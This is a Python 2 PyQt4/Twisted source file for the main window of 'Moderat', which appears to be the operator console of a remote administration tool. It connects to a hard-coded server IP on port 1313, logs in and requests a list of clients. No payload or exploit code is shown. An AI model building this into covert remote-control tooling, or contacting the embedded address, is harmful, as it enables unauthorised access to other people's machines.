# -*- coding: utf-8 -*-

import sys
import os
import string
import random

from PyQt4.QtGui import *
from PyQt4.QtCore import *

from ModeratorFactory import *

from libs.language import Translate
from libs.moderat.Actions import Actions
from libs.moderat.Modes import Modes
from ui import gui

SERVER_HOST = '109.172.189.74'
#SERVER_HOST = '127.0.0.1'
SERVER_PORT = 1313

# Multi Lang
translate = Translate()
_ = lambda _word: translate.word(_word)

# Main Window
class MainDialog(QMainWindow, gui.Ui_MainWindow):
    def __init__(self, reactor, parent=None):
        super(MainDialog, self).__init__(parent)
        self.reactor = reactor
        self.setupUi(self)

        # Initial Folders
        self.assets = os.path.join(os.path.dirname(sys.argv[0]), 'assets')
        self.flags = os.path.join(self.assets, 'flags')
        self.plugins = os.path.join(os.path.dirname(sys.argv[0]), 'plugins')

        # Session ID
        self.session_id = None

        # Create Protocol
        self.create_moderator()
        # Create Actions Object
        self.action = Actions(self)
        # Create Modes Object
        self.modes = Modes(self)

    def create_moderator(self):
        self.moderator = SocketModeratorFactory(
            self.on_moderator_connect_success,
            self.on_moderator_connect_fail,
            self.on_moderator_receive)

    # Start Connect To Server
    def on_connect_to_server(self):
        self.connection = self.reactor.connectTCP(SERVER_HOST, SERVER_PORT, self.moderator)

    # Connected To Server
    def on_moderator_connect_success(self):
        self.action.login()

    # Disconnected From Server
    def on_moderator_connect_fail(self, reason):
        # reason is a twisted.python.failure.Failure  object
        print 'disconnected'
        print 'cann\'t connect. reason: %s' % reason

    # Callbacks
    def on_moderator_receive(self, data):
        self.modes.check_mode(data)


    # Check Clients For Updates
    def check_clients(self):
        self.moderator.send_msg(message='getClients', mode='getClients', session_id=self.session_id)

#-------------------------------------------------------------------------------
if __name__ == "__main__":
    app = QApplication(sys.argv)
    try:
        import qt4reactor
    except ImportError:
        from twisted.internet import qt4reactor
    qt4reactor.install()

    from twisted.internet import reactor
    moderatWindow = MainDialog(reactor)
    moderatWindow.show()

    reactor.run()